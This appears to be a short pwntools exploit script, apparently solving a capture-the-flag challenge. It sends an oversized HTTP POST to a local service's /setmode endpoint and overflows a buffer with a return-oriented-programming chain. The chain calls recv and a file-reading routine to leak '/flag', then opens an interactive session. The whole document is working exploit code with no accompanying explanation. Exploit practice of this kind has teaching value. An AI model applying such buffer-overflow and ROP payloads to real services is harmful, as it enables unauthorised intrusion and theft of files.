from pwn import *

context.log_level = 'debug'

sh = remote('127.0.0.1', 9999)
elf = ELF('./main')

recv_plt = elf.plt['recv']
pop_rdi = 0x402ff3
pop_rsi_r15 = 0x402ff1
bss = 0x427000
read_file = 0x402663

def curl(body, content_length):
    http_req = b"POST /setmode HTTP/1.1\r\n"
    http_req += b"Host: 127.0.0.1:9999\r\n"
    http_req += b"Content-Type: application/x-www-form-urlencoded\r\n"
    http_req += b"Content-Length: " + str(content_length).encode() + b"\r\n"
    http_req += b"\r\n"
    http_req += body
    
    sh.send(http_req)

body = "setmode=" + "A"*1088 + "B"*8 + p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(recv_plt)
body += p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_file)

curl(body, len(body))

resp = sh.recv()
print(resp)

sh.send("/flag\x00\x00\x00")

sh.interactive()
